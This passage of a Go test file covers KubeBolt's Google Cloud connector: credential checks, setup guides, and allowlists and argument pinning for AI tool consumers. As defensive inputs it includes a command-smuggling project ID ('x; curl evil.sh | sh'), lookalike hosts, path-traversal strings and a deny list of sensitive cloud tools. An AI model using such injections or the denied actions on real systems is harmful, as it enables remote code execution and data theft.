package mcpcatalog

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"reflect"
	"slices"
	"sort"
	"strings"
	"testing"

	"golang.org/x/oauth2"

	"github.com/kubebolt/kubebolt/apps/api/internal/mcp/wire"
	"github.com/kubebolt/kubebolt/apps/api/internal/mcpclient"
)

// ----- definition -----

// Google Cloud is built but not offered: the catalog every install serves
// leaves it out, and only the preview catalog the tests use has it.
func TestGCPIsPreviewOnly(t *testing.T) {
	shipped, err := New()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := shipped.Get(gcpConnectorID); ok {
		t.Error("the shipped catalog offers Google Cloud")
	}
	withPreview, err := NewWithPreview()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := withPreview.Get(gcpConnectorID); !ok {
		t.Error("the preview catalog lacks Google Cloud")
	}
	if got, want := len(withPreview.List()), len(shipped.List())+len(Preview()); got != want {
		t.Errorf("preview catalog has %d connectors, want %d", got, want)
	}
}

func TestGCPDefinition(t *testing.T) {
	d := newGCPDef()
	if d.ID != "gcp" || d.Name != "Google Cloud" || d.MinPlan != "team" || d.Category != CategoryCloud {
		t.Fatalf("def = %+v", d)
	}
	if _, err := NewWith(d); err != nil {
		t.Fatalf("catalog refused the definition: %v", err)
	}
	if got := d.ModesFor(false); len(got) != 1 || got[0].ID != gcpModeServiceAccount {
		t.Fatalf("multi-tenant modes = %+v", got)
	}
	if got := d.ModesFor(true); len(got) != 2 || got[1].ID != gcpModeADC || !got[1].SelfHostedOnly {
		t.Fatalf("single-tenant modes = %+v", got)
	}
	sa, _ := d.Mode(gcpModeServiceAccount)
	var cred, project *FieldSchema
	for i := range sa.Fields {
		switch sa.Fields[i].Name {
		case gcpFieldCredential:
			cred = &sa.Fields[i]
		case "projectId":
			project = &sa.Fields[i]
		}
	}
	if cred == nil || !cred.Secret || !cred.Required || !cred.Multiline || cred.MaxLen != 32768 {
		t.Fatalf("credentialJSON = %+v", cred)
	}
	if project == nil || !project.Required || project.Pattern != gcpProjectIDPattern {
		t.Fatalf("projectId = %+v", project)
	}
	if len(d.Families) == 0 || len(d.Never) == 0 || d.DocsURL == "" {
		t.Fatal("families, never list and docs URL are required")
	}
}

func TestGCPFieldValidation(t *testing.T) {
	d := newGCPDef()
	sa, _ := d.Mode(gcpModeServiceAccount)
	ok := map[string]string{"projectId": "my-project-42", "location": "us-central1"}
	if err := ValidateConfig(sa, ok, map[string]bool{gcpFieldCredential: true}, map[string]string{gcpFieldCredential: gcpTestKey}); err != nil {
		t.Fatalf("valid config refused: %v", err)
	}
	for _, bad := range []map[string]string{
		{"projectId": "My-Project"},
		{"projectId": "short"},
		{"projectId": "projects/my-project"},
		{"projectId": "my-project-42", "location": "us-central1.evil.com"},
		{"projectId": "my-project-42", "location": "../x"},
	} {
		if ValidateConfig(sa, bad, map[string]bool{gcpFieldCredential: true}, nil) == nil {
			t.Errorf("accepted %v", bad)
		}
	}
	for _, good := range []string{"us-central1", "europe-west1", "northamerica-northeast1", "us-central1-a", "global"} {
		if !gcpLocationRE.MatchString(good) {
			t.Errorf("location %q refused", good)
		}
	}
}

func TestGCPCredentialChecks(t *testing.T) {
	var b gcpBinder
	selfHosted, saas := Env{AmbientAllowed: true}, Env{}
	wif := `{"type":"external_account","audience":"//iam.googleapis.com/projects/1/locations/global/workloadIdentityPools/p/providers/aws",` +
		`"subject_token_type":"urn:ietf:params:aws:token-type:aws4_request","token_url":"https://sts.googleapis.com/v1/token",` +
		`"service_account_impersonation_url":"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/` + gcpTestSA + `:generateAccessToken",` +
		`"credential_source":{"environment_id":"aws1","regional_cred_verification_url":"https://sts.{region}.amazonaws.com?Action=GetCallerIdentity&Version=2011-06-15"}}`

	if err := b.ValidateConfig(gcpModeServiceAccount, nil, map[string]string{gcpFieldCredential: gcpTestKey}, saas); err != nil {
		t.Fatalf("service account key refused: %v", err)
	}
	if id, err := gcpCheckCredentialJSON(gcpTestKey, false); err != nil || id != gcpTestSA {
		t.Fatalf("identity = %q, %v", id, err)
	}
	if err := b.ValidateConfig(gcpModeServiceAccount, nil, map[string]string{gcpFieldCredential: wif}, selfHosted); err != nil {
		t.Fatalf("WIF config refused on a self-hosted install: %v", err)
	}
	if id, _ := gcpCheckCredentialJSON(wif, true); !strings.HasPrefix(id, gcpTestSA) {
		t.Fatalf("WIF identity = %q", id)
	}

	refused := map[string]struct {
		mode string
		raw  string
		env  Env
	}{
		"not json":                {gcpModeServiceAccount, "not json -----BEGIN PRIVATE KEY-----", saas},
		"user credentials":        {gcpModeServiceAccount, `{"type":"authorized_user","client_secret":"hunter2"}`, saas},
		"no type":                 {gcpModeServiceAccount, `{"private_key":"-----BEGIN PRIVATE KEY-----x"}`, saas},
		"key without email":       {gcpModeServiceAccount, `{"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----x"}`, saas},
		"WIF in multi-tenant":     {gcpModeServiceAccount, wif, saas},
		"key with a foreign host": {gcpModeServiceAccount, strings.Replace(gcpTestKey, "oauth2.googleapis.com", "evil.example.com", 1), saas},
		"WIF reading a file": {gcpModeServiceAccount, strings.Replace(wif, `"environment_id":"aws1","regional_cred_verification_url":"https://sts.{region}.amazonaws.com?Action=GetCallerIdentity&Version=2011-06-15"`,
			`"file":"/var/run/secrets/token"`, 1), selfHosted},
		"ADC in multi-tenant": {gcpModeADC, "", saas},
	}
	for name, c := range refused {
		err := b.ValidateConfig(c.mode, nil, map[string]string{gcpFieldCredential: c.raw}, c.env)
		var fe *FieldError
		if !errors.As(err, &fe) {
			t.Errorf("%s: err = %v, want a *FieldError", name, err)
			continue
		}
		for _, leak := range []string{"BEGIN PRIVATE KEY", "hunter2", "/var/run/secrets"} {
			if strings.Contains(fe.Message, leak) {
				t.Errorf("%s: message quotes the credential: %q", name, fe.Message)
			}
		}
	}

	// What the oauth2 library says about a document it cannot load is not
	// repeated: a parser error can quote the input.
	fe := gcpCredentialRefused(errors.New("google: load credentials: invalid character 'S' in SECRETVALUE"))
	if strings.Contains(fe.Error(), "SECRETVALUE") {
		t.Fatalf("library error repeated: %v", fe)
	}
	if fe := gcpCredentialRefused(errors.New("google: token_uri must point at a googleapis.com host")); !strings.Contains(fe.Error(), "token_uri") {
		t.Fatalf("validator reason lost: %v", fe)
	}

	// Bind applies the same rules: a stored config that skipped validation
	// still cannot be used.
	f := newGCPFake(t, nil)
	r := gcpTestResolved(gcpTestProject)
	r.Secrets[gcpFieldCredential] = wif
	if _, err := f.binder(t).Bind(t.Context(), r, f.env(t)); err == nil {
		t.Fatal("bind accepted a WIF config in a multi-tenant install")
	}
	r = gcpTestResolved(gcpTestProject)
	r.Mode = gcpModeADC
	if _, err := f.binder(t).Bind(t.Context(), r, f.env(t)); err == nil {
		t.Fatal("bind accepted ADC in a multi-tenant install")
	}
	r = gcpTestResolved("Bad_Project")
	if _, err := f.binder(t).Bind(t.Context(), r, f.env(t)); err == nil {
		t.Fatal("bind accepted a malformed project id")
	}
}

func TestGCPGuide(t *testing.T) {
	g := gcpGuide(Env{}, map[string]string{"projectId": "my-project-42"})
	var all strings.Builder
	for _, s := range g.Steps {
		all.WriteString(s.Title + "\n" + s.Body + "\n" + s.Code + "\n")
	}
	text := all.String()
	for _, want := range append(gcpRoles(),
		"kubebolt-reader@my-project-42.iam.gserviceaccount.com",
		"mcp.googleapis.com/tools.call",
		"api.getAttribute('mcp.googleapis.com/tool.isReadOnly', false) == false",
		"does NOT cover", "execute_sql_readonly", "get_instance_auth_string", "read_object",
		"KubeBolt blocks those by name",
		"--attachment-point=cloudresourcemanager.googleapis.com/projects/my-project-42",
	) {
		if !strings.Contains(text, want) {
			t.Errorf("guide does not mention %q", want)
		}
	}
	for _, s := range gcpServices {
		if !strings.Contains(text, s.id+".googleapis.com") {
			t.Errorf("guide does not enable %s", s.id)
		}
	}
	if strings.Contains(text, "workload identity federation config instead") {
		t.Error("a multi-tenant guide offers WIF, which such installs refuse")
	}
	for _, s := range g.Steps {
		if s.Language == "json" {
			var v map[string]any
			if err := json.Unmarshal([]byte(s.Code), &v); err != nil {
				t.Fatalf("deny policy is not JSON: %v", err)
			}
		}
	}

	injected := gcpGuide(Env{AmbientAllowed: true}, map[string]string{"projectId": "x; curl evil.sh | sh"})
	for _, s := range injected.Steps {
		if strings.Contains(s.Code, "curl") {
			t.Fatalf("a malformed project reached a command: %q", s.Code)
		}
	}
	if !strings.Contains(injected.Steps[0].Code, "PROJECT_ID") {
		t.Fatal("expected the placeholder")
	}
	if !strings.Contains(injected.Steps[len(injected.Steps)-1].Body, "Application Default Credentials") {
		t.Fatal("a self-hosted guide should mention the alternatives to a key")
	}
}

// Every endpoint's viewer role is in the guide, so granting what the guide
// says makes every allowlisted tool answer.
func TestGCPEveryServiceHasARole(t *testing.T) {
	for _, s := range gcpServices {
		if gcpServiceRoles[s.id] == "" {
			t.Errorf("no viewer role for %s", s.id)
		}
	}
	if gcpRoles()[0] != "roles/mcp.toolUser" {
		t.Fatal("roles/mcp.toolUser must come first")
	}
}

// ----- the allowlist table -----

func TestGCPTableNeverListsADeniedTool(t *testing.T) {
	ids := make([]string, 0, len(gcpServices))
	for _, s := range gcpServices {
		ids = append(ids, s.id)
		if gcpDeniedServices[s.id] != "" {
			t.Errorf("service %s is denied", s.id)
		}
		for name, r := range s.tools {
			if why := gcpDenied(s.id, name); why != "" {
				t.Errorf("%s/%s is allowlisted but denied: %s", s.id, name, why)
			}
			if !r.kobi && !r.autopilot {
				t.Errorf("%s/%s is offered to no one", s.id, name)
			}
			if r.autopilot && !r.kobi {
				t.Errorf("%s/%s: Autopilot's set must stay a subset of Kobi's", s.id, name)
			}
			for _, f := range r.fill {
				if !slices.Contains(r.paths, f) && !slices.Contains(r.pathLists, f) {
					t.Errorf("%s/%s: fill %q is not a path field", s.id, name, f)
				}
			}
			if r.desc != "" {
				long := gcpDescription(r, "", strings.Repeat("p", 30), "northamerica-northeast1-a", len(r.projectIDs) > 0)
				if len(long) > gcpMaxToolDescription || strings.HasSuffix(strings.TrimSuffix(long, " Default location: northamerica-northeast1-a."), "…") {
					t.Errorf("%s/%s: hand-written description does not fit %d bytes with a 30-char project (%d)", s.id, name, gcpMaxToolDescription, len(long))
				}
			}
		}
	}
	if !sort.StringsAreSorted(ids) {
		t.Errorf("gcpServices is not sorted by id: %v", ids)
	}
}

func TestGCPDeniedNames(t *testing.T) {
	for _, c := range [][2]string{
		{"sqladmin", "execute_sql_readonly"}, {"sqladmin", "execute_sql"}, {"alloydb", "execute_sql_read_only"},
		{"redis", "get_instance_auth_string"}, {"storage", "read_object"}, {"storage", "read_text"},
		{"container", "get_k8s_resource"}, {"container", "get_k8s_logs"}, {"container", "list_k8s_events"},
		{"container", "apply_k8s_manifest"}, {"container", "create_cluster"}, {"container", "cancel_operation"},
		{"sqladmin", "update_instance"}, {"pubsub", "delete_topic"}, {"pubsub", "publish"},
		{"recommender", "mark_recommendation_claimed"}, {"alloydb", "export_data"}, {"alloydb", "import_data"},
		{"sqladmin", "restore_backup"}, {"sqladmin", "clone_instance"}, {"run", "deploy_service_from_image"},
		{"redis", "failover_instance"}, {"redis", "reschedule_maintenance"}, {"cloudbilling", "set_iam_policy"},
		{"sqladmin", "postgres_upgrade_precheck"}, {"cloudcli", "run_gcloud_command"}, {"cloudcli", "list_anything"},
		{"geminicloudassist", "ask_cloud_assist"}, {"spanner", "list_instances"}, {"bigquery", "list_dataset_ids"},
		{"firestore", "get_database"}, {"compute", "start_instance"}, {"compute", "set_instance_machine_type"},
		{"cloudasset", "export_iam_analysis_results"}, {"spanner", "create_session"}, {"firestore", "list_documents"},
	} {
		if gcpDenied(c[0], c[1]) == "" {
			t.Errorf("%s/%s is not denied", c[0], c[1])
		}
	}
	for _, name := range []string{"list_clusters", "get_instance", "list_timeseries", "query_range", "list_assets",
		"list_quota_infos", "get_instance_basic_info", "list_group_stats", "list_log_entries", "get_system_metrics"} {
		if why := gcpDenied("container", name); why != "" {
			t.Errorf("%s denied: %s", name, why)
		}
	}
}

func TestGCPToolNamesFitBothConsumers(t *testing.T) {
	for _, c := range []Consumer{ConsumerKobi, ConsumerAutopilot} {
		for _, local := range gcpToolNames(c) {
			if err := ValidateLocalName(gcpConnectorID, local); err != nil {
				t.Errorf("%s: %v", local, err)
			}
			if n := len("mcp__kubebolt__" + AutopilotToolName(gcpConnectorID, local)); n > MaxModelToolName {
				t.Errorf("%s: Autopilot wire name is %d chars", local, n)
			}
		}
	}
	kobi, auto := gcpToolNames(ConsumerKobi), gcpToolNames(ConsumerAutopilot)
	if len(kobi) < 25 || len(kobi) > 32 {
		t.Errorf("Kobi gets %d GCP tools; the lean target is ~25-30", len(kobi))
	}
	if len(auto) >= len(kobi) {
		t.Errorf("Autopilot (%d) must get a stricter subset of Kobi (%d)", len(auto), len(kobi))
	}
	for _, a := range auto {
		if !slices.Contains(kobi, a) {
			t.Errorf("Autopilot tool %s is not a Kobi tool", a)
		}
	}
}

func TestGCPFamiliesMatchTheTable(t *testing.T) {
	fams := gcpFamilyList()
	if len(fams) != len(gcpFamilies) {
		t.Fatalf("%d families derived, %d declared: a family has no tool", len(fams), len(gcpFamilies))
	}
	used := map[string]bool{}
	for _, s := range gcpServices {
		used[s.family] = true
	}
	for _, f := range fams {
		if !used[f.Label] || !f.Kobi {
			t.Errorf("family %q: used=%v kobi=%v", f.Label, used[f.Label], f.Kobi)
		}
	}
}

// ----- schemas and descriptions -----

func TestGCPNormalizeSchema(t *testing.T) {
	in := map[string]any{
		"$schema":              "https://json-schema.org/draft/2020-12/schema",
		"description":          "The request.",
		"type":                 "object",
		"additionalProperties": false,
		"$defs": map[string]any{
			"Interval": map[string]any{
				"description": "A time interval.",
				"type":        "object",
				"properties": map[string]any{
					"endTime":   map[string]any{"type": "string", "format": "google-datetime", "description": "End."},
					"startTime": map[string]any{"type": "string", "pattern": "^.*$"},
				},
				"required": []any{"endTime", "ghost"},
			},
		},
		"properties": map[string]any{
			"interval": map[string]any{"$ref": "#/$defs/Interval", "description": "The interval to read."},
			"view": map[string]any{
				"type": "string", "enum": []any{"FULL", "HEADERS"},
				"x-google-enum-descriptions": []any{"a", "b"},
				"description":                "See [the docs](https://cloud.google.com/monitoring) for " + strings.Repeat("details ", 60),
			},
			"choice": map[string]any{"oneOf": []any{map[string]any{"type": "string"}}},
			"names":  map[string]any{"items": map[string]any{"type": "string", "minLength": 1}},
		},
		"required": []any{"view", "missing"},
	}
	got, err := gcpNormalizeSchema(in)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]any{
		"type": "object",
		"properties": map[string]any{
			"interval": map[string]any{
				"type": "object", "description": "The interval to read.",
				"properties": map[string]any{
					"endTime":   map[string]any{"type": "string", "description": "End."},
					"startTime": map[string]any{"type": "string"},
				},
				"required": []any{"endTime"},
			},
			"view": map[string]any{
				"type": "string", "enum": []any{"FULL", "HEADERS"},
				"description": gcpCapText(gcpCleanText("See the docs for "+strings.Repeat("details ", 60)), gcpMaxPropDescription),
			},
			"choice": map[string]any{},
			"names":  map[string]any{"type": "array", "items": map[string]any{"type": "string"}},
		},
		"required": []any{"view"},
	}
	if !reflect.DeepEqual(got, want) {
		gb, _ := json.MarshalIndent(got, "", " ")
		t.Fatalf("normalized schema:\n%s", gb)
	}
	if d := got["properties"].(map[string]any)["view"].(map[string]any)["description"].(string); len(d) > gcpMaxPropDescription || strings.Contains(d, "http") {
		t.Fatalf("property description not cleaned and capped: %q", d)
	}

	for name, bad := range map[string]map[string]any{
		"unresolvable": {"properties": map[string]any{"x": map[string]any{"$ref": "#/$defs/Nope"}}},
		"remote":       {"properties": map[string]any{"x": map[string]any{"$ref": "https://example.com/schema"}}},
		"recursive": {
			"$defs":      map[string]any{"Node": map[string]any{"properties": map[string]any{"next": map[string]any{"$ref": "#/$defs/Node"}}}},
			"properties": map[string]any{"root": map[string]any{"$ref": "#/$defs/Node"}},
		},
		"too deep": gcpDeepSchema(gcpMaxSchemaDepth + 2),
	} {
		if _, err := gcpNormalizeSchema(bad); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func gcpDeepSchema(depth int) map[string]any {
	node := map[string]any{"type": "string"}
	for i := 0; i < depth; i++ {
		node = map[string]any{"type": "object", "properties": map[string]any{"x": node}}
	}
	return node
}

func TestGCPCapText(t *testing.T) {
	long := strings.Repeat("A sentence of words. ", 200)
	got := gcpCapText(long, 1200)
	if len(got) > 1200 || !strings.HasSuffix(got, ".") {
		t.Fatalf("capped at %d, ends %q", len(got), got[len(got)-5:])
	}
	words := strings.Repeat("word ", 400)
	if got := gcpCapText(words, 100); len(got) > 100 || !strings.HasSuffix(got, "…") {
		t.Fatalf("%q", got)
	}
	multi := strings.Repeat("é", 100)
	if got := gcpCapText(multi, 51); len(got) > 51 || !strings.HasSuffix(got, "…") {
		t.Fatalf("broke a rune: %q", got)
	}
}

// The snapshot is Google's real catalog, reduced. Binding against it must
// bind exactly the allowlist, within the prompt budget, with every
// description capped and the huge ones replaced.
func TestGCPSnapshotBindsTheAllowlistWithinBudget(t *testing.T) {
	f := newGCPFake(t, gcpSnapshotTools(t))
	r := gcpTestResolved(strings.Repeat("p", 30))
	r.Fields["location"] = "northamerica-northeast1"
	bd := f.bind(t, r)
	if len(bd.missing) > 0 {
		t.Fatalf("missing endpoints: %v", bd.missing)
	}
	for _, c := range []Consumer{ConsumerKobi, ConsumerAutopilot} {
		tools := bd.Tools(c)
		if got, want := gcpSpecNames(tools), gcpToolNames(c); !reflect.DeepEqual(got, want) {
			t.Fatalf("%s bound %v\nwant %v", c, got, want)
		}
		total := 0
		for _, s := range tools {
			total += gcpDefinitionSize(c, s)
			if len(s.Description) > gcpMaxToolDescription {
				t.Errorf("%s: description is %d bytes", s.Name, len(s.Description))
			}
			b, _ := json.Marshal(s.InputSchema)
			for _, kw := range []string{`"$schema"`, `"$ref"`, `"$defs"`, `"additionalProperties"`, `"oneOf"`, `"anyOf"`, `"format"`, `"x-google`, `"outputSchema"`} {
				if strings.Contains(string(b), kw) {
					t.Errorf("%s: schema keeps %s", s.Name, kw)
				}
			}
		}
		t.Logf("%s: %d tools, %d bytes", c, len(tools), total)
		if total > gcpKobiBudgetBytes {
			t.Errorf("%s: %d bytes of definitions, over the %d budget", c, total, gcpKobiBudgetBytes)
		}
	}
	byName := map[string]ToolSpec{}
	for _, s := range bd.Tools(ConsumerKobi) {
		byName[s.Name] = s
	}
	for local, want := range map[string]string{
		"databaseinsights_get_system_metrics": "cloudsql.googleapis.com/database/cpu/utilization",
		"databaseinsights_get_query_metrics":  "query_hash",
		"monitoring_list_timeseries":          "alignmentPeriod",
		"monitoring_query_range":              "PromQL",
		"logging_list_log_entries":            "timestamp desc",
	} {
		d := byName[local].Description
		if !strings.Contains(d, want) || strings.Contains(d, "Purpose and Key Capabilities") {
			t.Errorf("%s: expected KubeBolt's description, got %q", local, gcpCapText(d, 200))
		}
		if !strings.Contains(d, strings.Repeat("p", 30)) {
			t.Errorf("%s: description does not name the project", local)
		}
	}
	// Plain project fields are hidden and filled, never shown.
	for _, local := range []string{"sqladmin_get_instance", "compute_list_instances", "pubsub_get_subscription"} {
		props := gcpSchemaProps(byName[local].InputSchema)
		for _, hidden := range []string{"project", "projectId"} {
			if props[hidden] != nil {
				t.Errorf("%s shows %s", local, hidden)
			}
		}
	}
	if props := gcpSchemaProps(byName["databaseinsights_get_query_metrics"].InputSchema); props["resource"] != nil {
		t.Error("databaseinsights shows resource (the plain project id)")
	}
	if props := gcpSchemaProps(byName["monitoring_query_range"].InputSchema); props["location"] != nil {
		t.Error("query_range shows location, which only takes \"global\"")
	}
	if req, _ := byName["logging_list_log_entries"].InputSchema["required"].([]any); len(req) != 0 {
		t.Errorf("resourceNames is filled, so it must not be required: %v", req)
	}
}

// ----- binding -----

func gcpFilterFake(t *testing.T) *gcpFake {
	ro, rw := gcpBool(true), gcpBool(false)
	parent := map[string]any{"parent": gcpStr("Parent.")}
	name := map[string]any{"name": gcpStr("Name.")}
	return newGCPFake(t, map[string][]wire.Tool{
		"container": {
			gcpTool("list_clusters", ro, parent, "parent"),
			gcpTool("get_cluster", rw, name, "name"),          // allowlisted, flipped to write
			gcpTool("list_node_pools", nil, parent, "parent"), // allowlisted, annotations gone
			gcpTool("list_operations", ro, map[string]any{"parent": gcpStr("P."), "projectId": gcpStr("Deprecated.")}, "parent"), // grew a project field
			gcpTool("get_k8s_logs", ro, parent),
			gcpTool("create_cluster", rw, parent),
			gcpTool("brand_new_read", ro, parent),
		},
		"sqladmin": {
			gcpTool("list_instances", ro, map[string]any{"project": gcpStr("Project.")}),
			gcpTool("get_instance", ro, map[string]any{"project": gcpStr("Project."), "instance": gcpStr("Instance.")}, "project", "instance"),
			gcpTool("execute_sql_readonly", ro, map[string]any{"project": gcpStr("P."), "sqlStatement": gcpStr("SQL.")}),
		},
		"redis": {
			gcpTool("list_instances", ro, parent, "parent"),
			gcpTool("get_instance", ro, name, "name"),
			gcpTool("get_instance_auth_string", ro, name, "name"),
		},
	})
}

func TestGCPBindKeepsOnlyAllowlistedReadOnlyTools(t *testing.T) {
	f := gcpFilterFake(t)
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	want := []string{"container_list_clusters", "redis_get_instance", "redis_list_instances", "sqladmin_get_instance", "sqladmin_list_instances"}
	if got := gcpSpecNames(bd.Tools(ConsumerKobi)); !reflect.DeepEqual(got, want) {
		t.Fatalf("kobi tools = %v, want %v", got, want)
	}
	if got := gcpSpecNames(bd.Tools(ConsumerAutopilot)); !reflect.DeepEqual(got, []string{"container_list_clusters", "redis_list_instances", "sqladmin_get_instance", "sqladmin_list_instances"}) {
		t.Fatalf("autopilot tools = %v", got)
	}
	for _, refused := range []string{"container_get_k8s_logs", "sqladmin_execute_sql_readonly", "redis_get_instance_auth_string", "container_get_cluster", "container_create_cluster"} {
		res, err := bd.Call(t.Context(), ConsumerKobi, refused, nil)
		if err != nil || !res.IsError {
			t.Errorf("%s: res=%+v err=%v", refused, res, err)
		}
	}
	if n := len(f.calls()); n != 0 {
		t.Fatalf("refused tools reached the server %d times", n)
	}
}

func TestGCPSignsCallsButNotListings(t *testing.T) {
	f := gcpFilterFake(t)
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	if _, err := bd.Call(t.Context(), ConsumerKobi, "sqladmin_list_instances", nil); err != nil {
		t.Fatal(err)
	}
	var sawList, sawCall bool
	for _, r := range f.all() {
		switch r.method {
		case "tools/list":
			sawList = true
			if r.authorization != "" || r.userProject != "" {
				t.Errorf("tools/list to %s carried credentials", r.service)
			}
		case "tools/call":
			sawCall = true
			if r.authorization != "Bearer "+gcpTestToken || r.userProject != gcpTestProject {
				t.Errorf("tools/call headers: authorization=%q x-goog-user-project=%q", r.authorization, r.userProject)
			}
		}
	}
	if !sawList || !sawCall {
		t.Fatalf("list=%v call=%v", sawList, sawCall)
	}
}

func gcpPinFake(t *testing.T) *gcpFake {
	ro := gcpBool(true)
	return newGCPFake(t, map[string][]wire.Tool{
		"container": {gcpTool("list_clusters", ro, map[string]any{"parent": gcpStr("P."), "readMask": gcpStr("M.")}, "parent")},
		"sqladmin":  {gcpTool("get_instance", ro, map[string]any{"project": gcpStr("P."), "instance": gcpStr("I.")}, "project", "instance")},
		"monitoring": {
			gcpTool("list_timeseries", ro, map[string]any{"name": gcpStr("N."), "filter": gcpStr("F."), "pageSize": map[string]any{"type": "integer"},
				"orderBy": gcpStr("Unsupported."), "secondaryAggregation": map[string]any{"type": "object"}}, "name", "filter"),
			gcpTool("query_range", ro, map[string]any{"name": gcpStr("N."), "query": gcpStr("Q."), "location": gcpStr("L.")}, "name"),
		},
		"logging": {gcpTool("list_log_entries", ro, map[string]any{"resourceNames": map[string]any{"type": "array", "items": map[string]any{"type": "string"}},
			"projectIds": map[string]any{"type": "array", "items": map[string]any{"type": "string"}}, "filter": gcpStr("F."), "pageSize": map[string]any{"type": "integer"}}, "resourceNames")},
		"compute": {gcpTool("list_disks", ro, map[string]any{"project": gcpStr("P."), "zone": gcpStr("Z.")}, "project", "zone")},
	})
}

func TestGCPArgumentPinning(t *testing.T) {
	f := gcpPinFake(t)
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	p := gcpTestProject

	refused := map[string]struct{ tool, args string }{
		"another project":        {"container_list_clusters", `{"parent":"projects/other-project/locations/-"}`},
		"prefix lookalike":       {"container_list_clusters", `{"parent":"projects/` + p + `-evil/locations/-"}`},
		"organization":           {"container_list_clusters", `{"parent":"organizations/123"}`},
		"traversal":              {"container_list_clusters", `{"parent":"projects/` + p + `/../other-project/locations/-"}`},
		"encoded traversal":      {"container_list_clusters", `{"parent":"projects/` + p + `/%2e%2e/other"}`},
		"empty segment":          {"container_list_clusters", `{"parent":"projects/` + p + `//locations/-"}`},
		"not a string":           {"container_list_clusters", `{"parent":["projects/` + p + `"]}`},
		"unknown argument":       {"container_list_clusters", `{"parent":"projects/` + p + `/locations/-","projectId":"other-project"}`},
		"plain project mismatch": {"sqladmin_get_instance", `{"instance":"db","project":"other-project"}`},
		"dropped field":          {"monitoring_list_timeseries", `{"filter":"x","orderBy":"y"}`},
		"fixed field mismatch":   {"monitoring_query_range", `{"query":"up","location":"us-central1"}`},
		"list with a stranger":   {"logging_list_log_entries", `{"resourceNames":["projects/` + p + `","projects/other-project"]}`},
		"deprecated project ids": {"logging_list_log_entries", `{"projectIds":["other-project"]}`},
		"empty list":             {"logging_list_log_entries", `{"resourceNames":[]}`},
		"bad page size":          {"logging_list_log_entries", `{"pageSize":-3}`},
		"not an object":          {"container_list_clusters", `[1,2]`},
		"instance as a path":     {"sqladmin_get_instance", `{"instance":"../../other-project/instances/db"}`},
		"zone as a path":         {"compute_list_disks", `{"zone":"us-central1-a/../../x"}`},
		"zone dot-dot":           {"compute_list_disks", `{"zone":".."}`},
		"zone not a string":      {"compute_list_disks", `{"zone":{"a":1}}`},
	}
	for name, c := range refused {
		res, err := bd.Call(t.Context(), ConsumerKobi, c.tool, json.RawMessage(c.args))
		if err != nil || !res.IsError || !res.Own || !strings.HasPrefix(res.Text, "Not sent to Google Cloud") {
			t.Errorf("%s: res=%+v err=%v (a refusal KubeBolt writes is marked Own)", name, res, err)
		}
		if res.Audit["refused"] != "arguments" {
			t.Errorf("%s: audit = %v", name, res.Audit)
		}
	}
	if n := len(f.calls()); n != 0 {
		t.Fatalf("refused calls reached Google %d times", n)
	}

	accepted := []struct {
		tool, args string
		want       map[string]any
	}{
		{"container_list_clusters", `{"parent":"projects/` + p + `/locations/-"}`, map[string]any{"parent": "projects/" + p + "/locations/-"}},
		{"sqladmin_get_instance", `{"instance":"db"}`, map[string]any{"instance": "db", "project": p}},
		{"sqladmin_get_instance", `{"instance":"db","project":"` + p + `"}`, map[string]any{"instance": "db", "project": p}},
		{"monitoring_list_timeseries", `{"filter":"x"}`, map[string]any{"filter": "x", "name": "projects/" + p, "pageSize": float64(500)}},
		{"monitoring_list_timeseries", `{"filter":"x","pageSize":100000}`, map[string]any{"filter": "x", "name": "projects/" + p, "pageSize": float64(2000)}},
		{"monitoring_query_range", `{"query":"up"}`, map[string]any{"query": "up", "name": "projects/" + p, "location": "global"}},
		{"logging_list_log_entries", `null`, map[string]any{"resourceNames": []any{"projects/" + p}, "pageSize": float64(20)}},
		{"logging_list_log_entries", `{"resourceNames":["projects/` + p + `/locations/global/buckets/_Default/views/_AllLogs"],"pageSize":5}`,
			map[string]any{"resourceNames": []any{"projects/" + p + "/locations/global/buckets/_Default/views/_AllLogs"}, "pageSize": float64(5)}},
		{"compute_list_disks", `{"zone":"us-central1-a"}`, map[string]any{"zone": "us-central1-a", "project": p, "pageSize": nil}},
		{"compute_list_disks", `{"zone":"us-central1-a","project":null}`, map[string]any{"zone": "us-central1-a", "project": p}},
		{"logging_list_log_entries", `{"resourceNames":null,"pageSize":null}`, map[string]any{"resourceNames": []any{"projects/" + p}, "pageSize": float64(20)}},
	}
	for _, c := range accepted {
		before := len(f.calls())
		res, err := bd.Call(t.Context(), ConsumerKobi, c.tool, json.RawMessage(c.args))
		if err != nil || res.IsError {
			t.Errorf("%s %s: res=%+v err=%v", c.tool, c.args, res, err)
			continue
		}
		calls := f.calls()
		if len(calls) != before+1 {
			t.Fatalf("%s: no request reached Google", c.tool)
		}
		got := calls[len(calls)-1].args
		for k, v := range c.want {
			if v == nil {
				if _, present := got[k]; present {
					t.Errorf("%s: %s sent although the schema has no such field", c.tool, k)
				}
				continue
			}
			if !reflect.DeepEqual(got[k], v) {
				t.Errorf("%s %s: %s = %#v, want %#v", c.tool, c.args, k, got[k], v)
			}
		}
		if res.Audit["endpoint"] == nil || res.Audit["tool"] == nil {
			t.Errorf("%s: audit = %v", c.tool, res.Audit)
		}
	}
}

func TestGCPCheckResourceName(t *testing.T) {
	p := "my-project-42"
	for _, ok := range []string{
		"projects/my-project-42", "projects/my-project-42/locations/-",
		"projects/my-project-42/locations/us-central1/clusters/prod-1/nodePools/pool-a",
		"projects/my-project-42/locations/global/recommenders/google.container.DiagnosisRecommender",
		"projects/my-project-42/locations/-/clusters/-",
	} {
		if err := gcpCheckResourceName("parent", ok, p); err != nil {
			t.Errorf("%q refused: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"", "projects/", "projects/my-project-4", "projects/my-project-42x", "projects/my-project-42/",
		"projects/my-project-42/../x", "projects/my-project-42/./x", "projects/my-project-42/a b",
		"projects/my-project-42/a?b=c", "projects/my-project-42/a#b", "projects/my-project-42/%2F",
		"folders/1/projects/my-project-42", " projects/my-project-42", "projects/my-project-42/" + strings.Repeat("a", 1100),
	} {
		if err := gcpCheckResourceName("parent", bad, p); err == nil {
			t.Errorf("%q accepted", bad)
		}
